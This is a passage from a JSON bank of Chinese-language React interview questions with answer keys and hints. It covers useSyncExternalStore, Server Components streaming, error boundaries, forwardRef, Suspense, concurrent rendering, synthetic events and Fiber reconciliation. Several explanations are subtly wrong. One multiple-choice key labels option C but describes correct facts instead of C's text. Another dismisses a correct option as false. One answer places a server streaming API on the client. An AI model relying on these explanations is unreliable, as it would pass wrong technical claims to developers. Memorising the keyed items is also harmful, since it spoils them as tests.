Portal，但原生事件（addEventListener 绑定）不会，所以需要「点击外部关闭」时如果用原生事件监听 document.click，需要额外逻辑判断点击目标是否在 Portal 内容内。","hints":["Portal 内的点击事件为什么在 DOM 树和 React 组件树中有不同的冒泡路径","合成事件和原生事件在 Portal 场景下的事件处理有什么差异"],"tags":["React","Portal","事件","合成事件"],"id":3504},{"category":"react","difficulty":"hard","type":"short_answer","title":"React 18 useSyncExternalStore","content":"请解释React 18中useSyncExternalStore Hook的设计目的、核心用法及其解决了什么问题。","answer":"答案：1. 设计目的：useSyncExternalStore是React 18为外部状态存储（如Redux、Zustand、Immer、第三方全局状态、浏览器APIs等）设计的官方Hook，用于安全地订阅外部状态源并保证并发模式下的正确性。它解决了外部存储与React并发渲染（Concurrent Rendering）之间的撕裂（Tearing）问题。\\n2. 核心原因——Tearing问题：\\n   - 在React 18的并发模式下，组件渲染可以被中断和重启（time slicing）；\\n   - 如果外部存储的值在渲染过程中发生了变化，同一个组件的不同渲染「帧」可能看到不同的值，导致UI不一致（tearing）；\\n   - 传统的useSubscription或手动在useEffect中订阅无法保证并发模式下的正确性；\\n   - useSyncExternalStore强制外部状态在React的渲染时间片中保持同步（synchronous external snapshot），确保同一渲染周期内所有组件看到的值一致。\\n3. API签名与用法：\\n   const state = useSyncExternalStore(subscribe, getSnapshot, getServerSnapshot?)；\\n   - subscribe: (onStoreChange: () => void) => () => void——订阅函数，接收一个回调，当外部状态变化时调用该回调触发React重新渲染。返回清除订阅的函数；\\n   - getSnapshot: () => T——返回当前状态的快照。必须是一个纯函数，同一状态必须返回同一引用（===）。React用它获取当前状态值，并在re-render时比较前后快照；\\n   - getServerSnapshot（可选）——服务端渲染时使用的快照值；\\n   - 返回值T——当前快照值，是并发安全的。\\n4. 示例——订阅浏览器在线状态：\\n   function useOnlineStatus() {\\n     return useSyncExternalStore(\\n       callback => { window.addEventListener(「online」, callback); window.addEventListener(「offline」, callback); return () => { window.removeEventListener(「online」, callback); window.removeEventListener(「offline」, callback); }; },\\n       () => navigator.onLine,\\n       () => true // 服务器端默认认为在线\\n     );\\n   }\\n5. React内部实现机制：\\n   - React在渲染期间调用getSnapshot获取当前值；\\n   - 如果后续渲染中getSnapshot返回的值与之前不同（通过Object.is比较），React会在store上标记为「有未处理的更新」；\\n   - React在commit阶段之前强制重新渲染组件以确保UI一致性；\\n   - 在并发渲染中如果检测到外部状态变化，React会废弃当前渲染并重新开始。\\n6. 与class组件的componentDidMount/componentWillUnmount订阅模式的区别：\\n   - 旧模式：手动订阅、手动setState触发更新、手动比较快照、清理时需要取消订阅；\\n   - 新模式：统一接口、自动触发re-render、自动处理并发安全、自动清理。\\n7. 适配外部store的最佳实践：\\n   - Redux已内部集成useSyncExternalStore（通过React-Redux v8）；\\n   - Zustand v4+已使用useSyncExternalStore；\\n   - 任何自定义store，如果想兼容React 18并发模式，都应该使用useSyncExternalStore。\\n8. 性能优化策略：\\n   - 使用shallow comparison（浅比较）在subscribe中防止不必要的re-render；\\n   - 在getSnapshot中返回memoized/invariant的引用，避免返回新对象导致无限循环。","hints":["记住useSyncExternalStore的核心价值：在并发模式下保证「所有组件在同一个渲染周期内看到的外部状态是一致的」——这就是同步（sync）的含义","subscribe负责告诉React「什么时候需要重新检查快照」，getSnapshot负责「返回当前值并让React检查是否变化」——两个函数各司其职"],"tags":["React","useSyncExternalStore","并发模式","外部状态","Tearing"],"id":3505},{"category":"react","difficulty":"hard","type":"short_answer","title":"React Server Components 流式渲染","content":"请解释React Server Components（RSC）的流式渲染（Streaming）原理及其相比传统SSR的优势。","answer":"答案：1. RSC架构概述：React Server Components是一种由React 18+支持的组件架构模式，允许组件在服务器端渲染，其返回的是一种称为RSC Payload的特殊数据格式（一种序列化的React元素树，包含虚拟DOM描述和指令），而非传统的HTML字符串。\\n2. 流式渲染（Streaming Rendering）原理：\\n   - 服务器不再等待所有数据准备完毕再一次性返回整个HTML，而是将渲染结果分块（chunks）通过HTTP/1.1的分块传输编码（Chunked Transfer Encoding）或HTTP/2的流式响应发送给客户端；\\n   - 每个chunk包含一个React元素子树的信息（包括Suspense边界的状态、fallback内容的转变点等）；\\n   - 客户端逐步接收chunk并逐步渲染UI，不需要等待整个页面完成；\\n   - 使用< Suspense >划分流式边界——服务器可以快速发送Suspense包裹的fallback内容（如骨架屏），当对应数据到达后再发送真正的组件内容替换fallback。\\n3. RSC Payload格式（非HTML）：\\n   - RSC不直接返回HTML字符串，而是返回一个序列化的虚拟DOM树（React Element Tree），包括元素类型、props、children、以及M:N的客户端组件引用；\\n   - 该Payload可以直接被React Reconciler消费，客户端不需要解析HTML；\\n   - 格式示例：每行是一个JSON-like的指令元组（如I: id表示import指令，J: [type,props]表示React元素节点，S: fallback表示Suspense边界标记）。\\n4. 流式渲染的过程（以Next.js App Router为例）：\\n   - 请求到达后，服务器立即读取布局（Layout）的RSC Payload并开始流式发送（包括Shell部分）；\\n   - 当Suspense内的Server Components开始数据获取时，先发送其fallback的RSC Payload；\\n   - 数据获取完成后，服务器渲染对应的Server Components并发送替换fallback的payload流（streaming content replacement）；\\n   - 客户端React Reconciler接收每个chunk并逐步更新DOM——fallback被替换为实际内容，不需要重新渲染整个页面。\\n5. 与传统SSR的对比优势：\\n   - TTFB（首字节时间）更低：传统SSR需要等待所有数据获取完毕才开始发送HTML，RSC可以在数据准备好前就开始发送布局shell；\\n   - First Paint更快：浏览器逐步接收HTML并渲染，用户不必面对白屏；\\n   - 选择性注水（Selective Hydration）：RSC允许客户端逐步注水——不同的Suspense边界可以独立注水，不需要等待所有JS加载完成；\\n   - 带宽节省：RSC Payload比传统HTML+JS Bundle更轻量，因为Server Components的代码不会发送到客户端；\\n   - 零客户端JS：Server Components的代码完全不包含在客户端Bundle中（但Client Components仍会打包到客户端）。\\n6. 关键技术细节：\\n   - Next.js通过Web Streams API（ReadableStream）实现流式传输；\\n   - 客户端使用renderToPipeableStream（Node.js）或renderToReadableStream（Edge Runtime）消费RSC流；\\n   - 流式渲染期间，错误边界（Error Boundary）可以在流级别捕获并发送错误替换chunk。\\n7. 限制与注意事项：\\n   - RSC不能使用客户端Hooks（useState、useEffect等），不能使用浏览器API；\\n   - RSC的Props必须是可序列化的（不能传函数、回调）；\\n   - 流式渲染需要运行环境支持流式传输（某些CDN/代理可能不支持或缓冲整个响应）。","hints":["把流式渲染想象成「边做菜边上菜」——以前的SSR是「所有菜做好了一起上桌」，RSC是说「先上凉菜让客人吃着，热菜慢慢上」","RSC Payload不是HTML而是React元素的序列化格式——这意味着客户端接收数据后直接进入React Reconciler处理，没有HTML解析→DOM构建的过程"],"tags":["RSC","流式渲染","React Server Components","SSR","Next.js"],"id":3506},{"category":"react","difficulty":"medium","type":"short_answer","title":"React 错误边界 componentDidCatch","content":"请解释React错误边界（Error Boundary）的实现机制，以及componentDidCatch和getDerivedStateFromError两个生命周期方法的区别。","answer":"答案：1. 错误边界的作用：React错误边界是一种React组件，用于捕获其子组件树中抛出的JavaScript错误（主要指渲染期间的生命周期方法、构造函数、事件处理中的错误），记录错误日志并显示fallback UI，防止整个应用崩溃白屏。\\n2. 实现方式（class组件特有）：\\n   - 错误边界目前只能通过class组件实现（React Hooks中没有直接等价的功能）；\\n   - 需要在class组件中定义componentDidCatch(error, info)和/或getDerivedStateFromError(error)生命周期方法；\\n   - 只有定义了这些方法的class组件才成为错误边界。\\n3. componentDidCatch(error, info)：\\n   - 在commit阶段触发（已提交到DOM后），因此可以在回调中执行副作用（如发送错误报告到监控服务）；\\n   - 参数：error（抛出的错误对象），info.componentStack（包含组件栈追踪信息，显示哪个组件抛出了错误）；\\n   - 用于日志记录和错误报告，不应该在这里修改state（如果需要显示fallback UI，应该使用getDerivedStateFromError）；\\n   - 因为在commit阶段执行，理论上可以进行setState（React允许但在同一commit中不会立即生效，会触发下一次渲染）。\\n4. getDerivedStateFromError(error)：\\n   - 在render阶段触发（在错误发生时立即调用），是一个静态方法（static）；\\n   - 参数：error（抛出的错误对象）；\\n   - 返回值：应返回一个state更新对象（如{ hasError: true }），用于更新错误边界组件的内部状态以显示fallback UI；\\n   - 因为是静态方法，没有this访问，不能执行副作用（如日志记录）；\\n   - 因为是在render阶段触发，不影响commit性能。\\n5. 生命周期执行顺序：\\n   - 子组件树中抛出错误时，React捕获错误；\\n   - 首先调用getDerivedStateFromError(error)返回新的state对象；\\n   - 然后触发错误边界组件的重新渲染（使用更新后的state）；\\n   - 渲染完成后，在commit阶段调用componentDidCatch(error, info)用于日志记录。\\n6. 错误边界捕获错误的范围：\\n   - 能捕获：render生命周期中的错误、componentDidMount/componentDidUpdate/componentWillUnmount中的错误、构造函数中的错误；\\n   - 不能捕获：事件处理中的错误（需要自己用try/catch）、异步代码中的错误（setTimeout/Promise的catch/resolve中）、服务端渲染中抛出的错误、错误边界自身的错误（需要在上层嵌套另一个错误边界）。\\n7. 最佳实践：\\n   - 在应用的根级别放置一个全局错误边界（通用fallback UI + 错误上报）；\\n   - 在独立的功能模块（如侧边栏、主内容区、弹窗）各自放置错误边界，一个模块崩溃不影响其他模块；\\n   - 结合Suspense使用——Suspense处理加载状态，Error Boundary处理错误状态；\\n   - 使用react-error-boundary库（社区封装，通过useErrorBoundary Hook提供声明式API）。\\n8. Hook方式的替代方案：\\n   - React官方暂无Hooks版本的内置错误边界；\\n   - 社区方案：react-error-boundary提供了<ErrorBoundary FallbackComponent={...}>和useErrorBoundary Hook的封装；\\n   - 也可使用class组件包裹Hooks组件，class组件负责错误捕获，内部使用Hooks组件。","hints":["记住这两个方法的职责分离：getDerivedStateFromError管「展示什么」（更新state显示fallback UI），componentDidCatch管「记录什么」（发送错误日志）","错误边界只能捕获生命周期中的错误。事件处理中的错误需要自己用try/catch处理"],"tags":["React","错误边界","componentDidCatch","异常处理","生命周期"],"id":3507},{"category":"react","difficulty":"hard","type":"short_answer","title":"React forwardRef 与 useImperativeHandle","content":"请解释React中forwardRef和useImperativeHandle的作用、使用方式以及它们的配合关系。","answer":"答案：1. forwardRef的作用：forwardRef是React提供的一个高阶组件（HOC），用于将ref从父组件传递（转发）给子组件中的某个具体DOM元素或组件实例。React的函数组件默认不接受ref属性（因为函数组件没有实例），forwardRef允许函数组件接收第二个参数ref，使其能够「接住」父组件传递的ref。\\n2. forwardRef的使用方式：\\n   const MyInput = forwardRef((props, ref) => {\\n     return <input ref={ref} {...props} />;\\n   });\\n   // 父组件使用\\n   const ref = useRef(null);\\n   <MyInput ref={ref} />;\\n   ref.current.focus(); // 直接操作子组件内的input元素\\n3. forwardRef的常见场景：\\n   - 聚焦控制：父组件需要控制子组件内某个输入框的聚焦（如表单验证后聚焦到错误字段）；\\n   - 动画/过渡库：父组件需要访问子组件的DOM元素执行动画（如framer-motion）；\\n   - 第三方库集成：需要将DOM引用传递给第三方库（如D3图表挂载点）；\\n   - 测量尺寸和位置：父组件需要测量子组件内特定元素的尺寸。\\n4. useImperativeHandle的作用：\\n   - 配合forwardRef使用，在子组件中自定义暴露给父组件ref的实例值（ref.current）的内容；\\n   - 通常是为了限制父组件对子组件内部DOM的直接访问权限，只暴露「需要暴露」的方法和属性；\\n   - 是封装内部实现细节的关键手段。\\n5. useImperativeHandle的使用方式：\\n   const MyInput = forwardRef((props, ref) => {\\n     const inputRef = useRef(null);\\n     useImperativeHandle(ref, () => ({\\n       focus: () => inputRef.current.focus(),\\n       scrollToTop: () => inputRef.current.scrollIntoView({ behavior: 'smooth' }),\\n       validate: () => inputRef.current.checkValidity(),\\n       value: props.value, // 也可以暴露属性\\n     }), [props.value]); // 依赖数组，类似useEffect\\n     return <input ref={inputRef} {...props} />;\\n   });\\n   // 父组件只能使用ref.current.focus()、ref.current.scrollToTop()，而不能直接操作input元素本身\\n6. useImperativeHandle的依赖管理：\\n   - 第三个参数是依赖数组（deps），类似useEffect的依赖管理；\\n   - 当依赖变化时，回调函数会重新执行，更新暴露的实例值；\\n   - 如果不提供依赖数组，回调会在每次渲染时执行（可能造成不必要的对象重建）；\\n   - 如果依赖数组为空（[]），暴露的实例值在整个生命周期内不会更新。\\n7. 配合关系与最佳实践：\\n   - forwardRef是基础设施（提供ref转发的通道），useImperativeHandle是安全阀门（控制ref的内容）；\\n   - 优先使用声明式props而非命令式ref：能用state/props控制的行为尽量不用ref暴露方法；\\n   - ref是一种「逃生舱口」（Escape Hatch），不要过度使用；\\n   - 在UI库/组件库中（如Ant Design、Radix UI），多数受控组件会结合forwardRef和useImperativeHandle暴露验证、聚焦等命令式方法。\\n8. TypeScript中的类型定义：\\n   - forwardRef配合泛型：MyInput = forwardRef<MyHandle, MyProps>((props, ref) => ...)\\n   - MyHandle定义useImperativeHandle暴露的实例类型（{ focus(): void; validate(): boolean }等）；\\n   - 父组件useRef<MyHandle>(null)获得正确的类型推断。","hints":["forwardRef是「把ref递到子组件内部」的通道，useImperativeHandle是「控制ref递进去后暴露什么出来」的守门员——两个一起用才完整","能不用ref就不用ref——ref是对React声明式编程范式的「逃逸」，只应该在焦点管理、尺寸测量、动画集成等命令式场景使用"],"tags":["React","forwardRef","useImperativeHandle","ref","组件封装"],"id":3508},{"category":"react","difficulty":"hard","type":"short_answer","title":"React 并发模式下的 Suspense","content":"请解释React 18并发模式（Concurrent Mode/Concurrent Features）下Suspense的工作机制及其与非并发模式下Suspense的区别。","answer":"答案：1. React 18之前的Suspense：\\n   - 仅支持React.lazy()的动态加载场景（code splitting）；\\n   - 当组件还未加载完成时显示fallback内容；\\n   - 不支持数据获取——社区方案（如Relay、SWR、React Query的Suspense模式）是框架自身模拟的，React核心并未原生支持数据获取的Suspense；\\n   - Suspense一旦触发fallback，子树全部消失并重新从头渲染（会导致已挂载的子组件卸载后重新挂载）。\\n2. React 18并发模式下Suspense的新能力：\\n   - 数据获取Suspense：配合Suspense-enabled的数据框架（如Relay、SWR、React Query v5+、Next.js App Router的Server Components），Suspense可以在数据获取期间显示fallback；\\n   - 流式Suspense：在服务器端流式渲染中，Suspense边界可以逐块发送——每个Suspense边界的fallback和实际内容可以独立流式传输（Next.js App Router的核心机制）；\\n   - 选择性注水（Selective Hydration）：客户端可以按Suspense边界逐个注水，注水顺序由用户交互决定（点击了哪个交互区域，那个区域的Suspense优先注水）。\\n3. 并发模式的核心机制——可中断渲染：\\n   - React 18在并发模式下启动渲染时，不会一次性完成整个渲染工作，而是将渲染工作拆分为可中断的单位（work units）；\\n   - 当Suspense包裹的组件挂起（throw a Promise），React不会丢弃已经渲染的树，而是「记住」当前的渲染进度，挂起该部分，显示fallback；\\n   - 当数据或代码就绪后，React恢复被挂起的渲染，从之前中断的地方继续，不会从头渲染；\\n   - 这个过程被称为Transition-based Suspense。\\n4. Suspense的行为机制（旧的和新的）：\\n   - 当子组件抛出（throw）一个Promise时，React从最近的Suspense边界上寻找fallback；\\n   - 在React 18 Legacy模式（非并发）中，首次渲染遇到Suspense时，会立刻丢弃子组件树渲染，直接用fallback替换——这意味着组件内部的useEffect等副作用已经被触发；\\n   - 在React 18并发模式中，如果Suspense触发了，React会保留之前已经渲染的Sibling组件，只显示Suspense内的fallback，隐藏子组件树。已渲染的子树保持在内存中（但不显示），不会卸载。当Promise resolve后，恢复渲染并通过DOM diff最小化更新。\\n5. React 18中的useTransition与Suspense配合：\\n   - startTransition()将状态更新标记为低优先级过渡（Transition）；\\n   - 当Transition更新导致一个Suspense边界被触发时，React不丢弃旧的屏幕（旧屏幕是之前渲染好的），而是保持旧屏幕可见，直到新内容就绪后再切换到新内容（不会出现闪烁fallback == 旧屏幕闪现fallback → 新内容）；\\n   - 这个机制称为「挂起旧内容避免回退到fallback」——这是并发模式下Suspense的行为改进。\\n6. Suspense边界嵌套与优先级：\\n   - Suspense边界可以嵌套，外层Suspense的fallback在内部Suspense全部就绪之前显示；\\n   - 不同Suspense边界可以具有不同的优先级，高优先级的Suspense可以「跳过」等待低优先级的Suspense；\\n   - 在Next.js中，Suspense边界相当于流式传输中的「分块边界」——每个边界的内容可以独立流式到达客户端。\\n7. 注意事项与陷阱：\\n   - Suspense目前不能配合事件处理使用（事件处理中的setState不会由Suspense接管）；\\n   - 过多的Suspense边界会导致过度拆分和性能问题；\\n   - 没有Suspense包裹的区域如果抛出错误，错误会冒泡到应用顶层（建议配合Error Boundary使用）。","hints":["并发模式下Suspense的核心改进是「可恢复」——旧Suspense触发后会卸载子树重新挂载，新Suspense在数据就绪后从挂起点恢复渲染，不会丢失内部状态","Legacy Suspense = 「要么显示内容要么显示fallback，来回切换」；Concurrent Suspense = 「保持当前内容直到新内容就绪，平滑过渡」"],"tags":["React","Suspense","并发模式","流式渲染","Transition"],"id":3509},{"category":"react","difficulty":"medium","type":"short_answer","title":"React 并发模式（Concurrent Features）原理","content":"请解释 React 18 并发模式（Concurrent Mode/Concurrent Features）的核心原理。useTransition、useDeferredValue、Suspense 和 startTransition 分别在什么场景下使用？并发渲染如何实现任务中断和恢复？并发模式对 useEffect、useLayoutEffect 的执行时机有什么影响？","answer":"答案：React 并发模式的核心是「可中断渲染」（Interruptible Rendering）。渲染过程可以被打断、暂停、恢复或放弃，让高优先级更新（如用户输入）先于低优先级更新（如列表渲染）完成。useTransition 标记低优先级的状态更新可降级，useDeferredValue 延迟更新某个值，Suspense 协调异步数据的加载状态。并发模式下渲染被分割为可中断的单元，通过时间切片（Time Slicing）和优先级调度实现。\n\n解析：并发模式的核心机制——1）时间切片（Time Slicing）：React 将渲染工作分割为 5ms 左右的小单元，每执行一个单元检查是否有更高优先级的任务（如用户事件）需要处理。有的话暂停当前渲染，优先处理高优先级更新。2）优先级调度：React 使用 Lane 模型（32 条车道 Lane 表示不同优先级）。输入事件（InputDiscrete）优先级最高，Transition 更新（如导航切换、列表过滤）优先级最低。高优先级的更新可以打断低优先级的渲染。3）双缓冲 Fiber 树：React 维护 current Fiber 树（已提交到屏幕）和 workInProgress Fiber 树（正在构建）。可中断渲染发生在 workInProgress 树上，current 树不受影响，因此用户始终看到一致的状态。\n\nAPI 详解——1）startTransition：将状态更新标记为 Transition（低优先级过渡更新），通知 React 可以被打断。典型场景：输入框输入时过滤长列表。2）useTransition：返回 [isPending, startTransition]。isPending 告知用户加载状态，允许在等待时显示过渡反馈。3）useDeferredValue：接收一个值，返回延迟版本的值（优先使用旧值，在新值准备好后切换）。适合「将某数据的更新降级」——如搜索输入即时显示，搜索结果延迟渲染。4）Suspense：定义数据加载边界。子组件抛出 Promise（如 React.lazy、Relay、SWR），Suspense 捕获并显示 fallback。并发模式下 Suspense 更加强大：多个 Suspense 边界可以嵌套、组合、并行等待。\n\n对 Effect 的影响——useEffect（被动同步）在并发模式下仍然在浏览器完成布局和绘制后的 commit 阶段执行，行为不变。useLayoutEffect（主动同步）在 DOM 突变后同步执行，阻塞浏览器绘制。并发模式下，如果高优先级更新打断低优先级的提交，低优先级的 useLayoutEffect cleanup 会先执行，再执行高优先级的 useLayoutEffect。这与传统模式（批处理更新，一次性提交）不同。","hints":["时间切片每 5ms 检查一次高优任务","Lane 模型中输入优先级最高"],"tags":["React","并发模式","useTransition","Fiber","时间切片"],"id":3510},{"category":"react","difficulty":"easy","type":"choice","title":"React Server Components 架构设计","content":"关于 React Server Components（RSC）的描述，以下哪个是错误的？","options":["A) RSC 在服务器端渲染，不包含交互逻辑，不会向客户端发送 JavaScript bundle","B) RSC 可以自然地访问后端资源（数据库、文件系统、微服务 API），无需额外 API 路由","C) RSC 与 SSR（Server-Side Rendering）是同一概念，它们都在服务器端生成 HTML 发送给客户端","D) RSC 的「use client」指令标志着该文件的组件树边界——此边界内的所有组件在客户端运行"],"answer":"答案：C) Server Components 在服务端渲染，不发送 JavaScript 到客户端，可访问数据库和文件系统，减少客户端 bundle 体积\n\n解析：React Server Components（RSC）的核心特性——1）零客户端 Bundle：RSC 的代码只在服务端执行，不会发送到客户端。2）直接访问后端：可以直连数据库、文件系统、微服务。3）自动代码分割：客户端组件和服务器组件的边界自动成为代码分割点。4）流式渲染：RSC 支持 Suspense 边渲染边发送。RSC 与 SSR 不同——SSR 在服务端渲染 HTML，RSC 渲染特殊的 JSON 格式（React Flight），客户端收到后转换为虚拟 DOM。","hints":["RSC 返回虚拟 DOM 树而非 HTML","Server Component 不产 JS 字节"],"tags":["React","Server Components","RSC","SSR","架构"],"id":3511},{"category":"react","difficulty":"medium","type":"short_answer","title":"React 合成事件系统与事件委托","content":"请解释 React 的合成事件（SyntheticEvent）系统。React 17 之前和之后的事件委托机制有什么变化？合成事件池（SyntheticEvent Pooling）在 React 17 前后的区别是什么？React 事件系统和原生 DOM 事件系统如何共存？","answer":"答案：React 的合成事件是跨浏览器包装层，抹平了不同浏览器的事件 API 差异。React 17 之前所有事件委托在 document 上，React 17 之后委托到 root DOM 容器（React 挂载点），不再依赖 document。React 17 也移除了合成事件池的复用机制——不再需要 e.persist() 来阻止事件对象回收。\n\n解析：事件委托机制——React 不会将事件处理器直接绑定到对应的 DOM 元素上，而是通过事件委托在根容器上统一监听。当事件冒泡到委托节点时，React 根据事件的目标元素找到对应的 Fiber 节点，遍历 Fiber 树执行匹配的事件处理器。\n\nReact 17 的变化（根部委托变更）——1）React 16 将所有事件绑定到 document.addEventListener。问题：多个 React 版本嵌套时（微前端场景），子版本的事件会冒泡到父版本的 document 监听器，互相干扰。React Native + React DOM 的混用也受影响。2）React 17 将事件委托到 ReactDOM.createRoot() 的 root 容器上（通常是 <div id=\"root\">）。多版本共存时各版本的事件互不干扰。\n\n合成事件池的变化——React 16 中，合成事件对象被池化复用。事件回调执行完毕后事件对象的所有属性被清空（返回 null）。如果异步访问事件属性（如 setTimeout 中），需要调用 e.persist() 从池中取出。React 17 完全移除了事件池机制——每次事件创建新的事件对象，不再需要 e.persist()。\n\n扩展延伸：React 事件与原生事件共存——1）React 的 stopPropagation() 阻止的是合成事件的冒泡，不阻止原生 DOM 事件冒泡——需要同时调用原生 e.nativeEvent.stopPropagation()。2）如果 DOM 元素上直接绑定了原生事件监听，React 的合成事件不会自动覆盖它。3）在 React 18 的自动批处理（Automatic Batching）中，合成事件回调内的状态更新自动批处理，但原生事件回调内的状态更新不在 React 调度范围内，需要手动 flushSync。","hints":["React 17 事件委托改到 root 节点","React 17 移除了事件对象池"],"tags":["React","合成事件","事件委托","微前端"],"id":3512},{"category":"react","difficulty":"medium","type":"choice","title":"React Hook 的底层实现机制","content":"React Hooks（如 useState、useEffect）在 Fiber 架构中的底层实现依赖于什么机制来保证每次渲染时 Hook 的正确顺序和状态读取？","options":["A) React 在组件函数中通过 Proxy 代理拦截 Hook 调用，自动解析依赖","B) React 通过 Fiber 节点上的单向链表存储 Hook 状态，每次渲染时按调用顺序遍历链表读取","C) React 在全局维护一个「当前组件」的状态栈，Hook 调用时从栈顶读取数据","D) React 通过闭包将每个 Hook 的状态封装在独立的闭包作用域中"],"answer":"答案：B) Hook 底层通过链表结构（Fiber 节点的 memoizedState 属性）存储 Hook 状态，通过顺序调用保证每次渲染时 Hook 链表的正确匹配\n\n解析：React Hooks 的实现细节——1）每个 Fiber 节点上的 memoizedState 属性指向一个 Hook 链表的头节点。每个 Hook 调用在链表上追加一个节点。2）Hook 节点结构包括：queue（更新队列）、next（下一个 Hook）。3）为什么 Hooks 不能放在条件语句中：因为 React 依赖每次渲染时 Hook 的调用顺序和次数完全一致来从链表上正确取回状态。","hints":["Fiber 上 Hook 链表按顺序遍历","Hook 状态存在 Fiber 而非闭包中"],"tags":["React","Hooks","Fiber","实现原理"],"id":3513},{"category":"react","difficulty":"hard","type":"short_answer","title":"React Refs 完整体系与 forwardRef","content":"请全面分析 React 中 ref 的演进和完整体系。字符串 ref（已废弃）、回调 ref、createRef、useRef、forwardRef、useImperativeHandle 各自的作用和底层实现原理是什么？ref 在类组件和函数组件中的行为有什么不同？forwardRef 解决了什么根本问题？","answer":"答案：ref 是 React 获取 DOM 节点或组件实例的「逃生舱」。演进路径：字符串 ref（React 16 前，问题多已废弃）→ 回调 ref → createRef（类组件）→ useRef（函数组件）→ forwardRef（转发 ref 到子组件 DOM）→ useImperativeHandle（限制暴露给父组件的实例方法）。ref 的本质是一个 Fiber 节点上的属性，在 commit 阶段由 React 赋值或执行回调。\n\n解析：各类 ref 的实现原理——1）字符串 ref（已废弃）：this.refs.myRef 访问，问题——字符串不被静态检查、可能重复、性能差（需要遍历 Fiber 树查找）。已被废弃。2）回调 ref：<div ref={el => this.myRef = el}>，更灵活——在组件挂载时调用（参数为 DOM 元素），卸载时调用（参数为 null）。回调 ref 是最底层的 ref 形式，其他 ref 都是它的封装。3）createRef：React.createRef() 返回 { current: null } 对象，React 在 commit 阶段将 DOM 节点赋值给 current。本质上是对回调 ref 的封装。4）useRef：useRef(initialValue) 返回一个在整个组件生命周期内保持引用的 mutable 对象。底层实现：在 Fiber 节点的 memoizedState 链表上创建一个新的 Hook 节点，初始值存储在 Hook.memoizedState 中。每次渲染返回同一个对象引用（不是新建）。useRef 的值变化不会触发 re-render。\n\nforwardRef——React.forwardRef 返回一个经过特殊处理的 React 元素类型。其 Fiber 节点标记了特殊 flag 指示渲染阶段应将父组件传入的 ref 传递给子组件的渲染函数。没有 forwardRef 时函数组件不接收 ref（因为函数组件没有实例，不同于类组件）。forwardRef 解决了「函数不能接收 ref」的问题。\n\nuseImperativeHandle——与 forwardRef 配合使用，限制父组件能调用的子组件方法。子组件通过 useImperativeHandle(ref, () => ({ focus, scrollTo })) 定义暴露的 API。底层：创建了一个闭包包装的 ref 对象，只有显式返回的属性能被父组件访问。\n\n扩展延伸：ref 的最佳实践——1）避免过度使用 ref，React 提倡「声明式编程」而非命令式。2）动画控制、焦点管理、第三方库集成（如 D3、Chart.js）是 ref 的合理使用场景。3）ref 转发在组件库开发中异常重要——Input、Modal、Tooltip 等需要对外暴露 DOM 操作方法。4）React 18 的 useSyncExternalStore 避免了使用 ref 同步外部状态的需要。","hints":["回调 ref 是所有 ref 形式的底层","函数组件没有实例无法直接接收 ref","useRef 变化不触发 re-render"],"tags":["React","ref","forwardRef","useImperativeHandle","架构"],"id":3514},{"category":"react","difficulty":"medium","type":"short_answer","title":"React Fiber 协调算法：双缓冲、优先级与 bailout","content":"React Fiber 架构中协调（Reconciliation）的双缓冲机制是如何工作的？Fiber 节点如何通过副效应标签（EffectTag）追踪需要更新的操作？bailout 的条件和优化意义是什么？","answer":"答案：Fiber 使用双缓冲——current 树（当前屏幕上显示 UI 对应的 Fiber 树）和 workInProgress 树（正在构建的下一版 UI）。状态更新时 React 在 workInProgress 树上执行协调，完成后通过「根节点指针切换」（root.current = workInProgress）使新树生效。workInProgress 树构建完成后，旧的 current 树被回收（下次构建时作为新的 workInProgress 复用，节约内存分配）。\n\n解析：Fiber 副效应追踪——Fiber 协调的两个阶段：Render Phase（可中断）和 Commit Phase（不可中断）。在 Render Phase 中，React 遍历 workInProgress 树，执行 beginWork（比较当前 Fiber 与新的 React Element，产生子 Fiber）和 completeWork（处理 Fiber 的 DOM 操作标记）。每当发现节点需要更新（属性变化、状态变化），在该 Fiber 节点上打上 effectTag 标记（如 Placement、Update、Deletion、Ref、Passive 等）。所有带副效应标记的 Fiber 被串联成 effect list（单向链表），在 Commit Phase 中按 order 遍历并执行实际的 DOM 操作。\n\n扩展延伸：bailout 机制——当 React 判断一个子树不需要重新渲染时，会跳过该子树的协调（bailout）。bailout 的条件：1）oldProps === newProps（通过 React.memo 浅比较或父组件传来的 props 引用未变）。2）该 Fiber 没有使用 Context。3）该 Fiber 没有 pending 的 state update。4）该 Fiber 的父节点没有 bailout — 父节点 bailout 直接跳过整棵子树。bailout 的优化意义——跳过整棵子树的协调，不创建新 Fiber、不运行 diff、不收集 effect。频繁 bailout 的组件（如 React.memo 包裹的纯展示组件）几乎不消耗协调时间。这就是为什么在 React 中保持 props 引用稳定（不创建内联对象/箭头函数）能显著提升性能——更多的 bailout 意味着更少的协调工作。","hints":["双缓冲如何避免构建过程中用户看到不完整的 UI——同时存在 current 和 workInProgress 两棵树","bailout 四个条件中哪一个最容易被开发者的代码影响——oldProps === newProps 需要稳定的 props 引用"],"tags":["React","Fiber","协调","性能","架构"],"id":3515},{"category":"react","difficulty":"medium","type":"choice","title":"useSyncExternalStore 与外部状态集成","content":"React 18 引入的 useSyncExternalStore 主要用于解决什么问题？以下关于 useSyncExternalStore 的说法正确的是：","options":["A) useSyncExternalStore 用于替代 useEffect + useState 实现所有数据获取场景","B) useSyncExternalStore 的 subscribe 函数返回一个取消订阅函数，当组件卸载或 store 变化时自动调用","C) useSyncExternalStore 主要用于读取外部数据源（如 Redux、Zustand、浏览器 API）并保证并发模式下的数据一致性","D) useSyncExternalStore 需要传入 getSnapshot 函数，该函数只在组件首次渲染时调用一次"],"answer":"C) useSyncExternalStore 主要用于读取外部数据源（如 Redux、Zustand、浏览器 API）并保证并发模式下的数据一致性\n\n解析：useSyncExternalStore(subscribe, getSnapshot, getServerSnapshot) 是 React 18 提供的 Hook，用于安全地从外部存储读取数据并提供给 React 组件。核心价值：在并发模式下保证外部数据的「一致性」（tearing 问题——同一数据在同一渲染中在不同组件显示不同值）。subscribe 函数接收一个 callback，当外部 store 变化时调用该 callback 触发 React 重新渲染。说法 A 错误——它不替代数据获取，只替代外部状态订阅。说法 B 错误——subscribe 应返回取消订阅函数，由 React 在 cleanup 时调用。说法 D 错误——getSnapshot 在每次渲染和 store 变化时都会调用（用于比较快照一致性）。\n\n扩展延伸：为什么需要 useSyncExternalStore——在 React 18 并发模式下，组件的渲染可能被中断和恢复。如果组件在两次渲染之间读取外部 store，得到不同的值，会导致 UI 中出现「撕裂」（tearing）——同一数据在同一渲染中显示不一致。useSyncExternalStore 通过 forceSync 机制保证在单个同步渲染中 getSnapshot 返回一致的值。经典使用场景——1）Redux：React-Redux v8 内部使用 useSyncExternalStore 替代手动 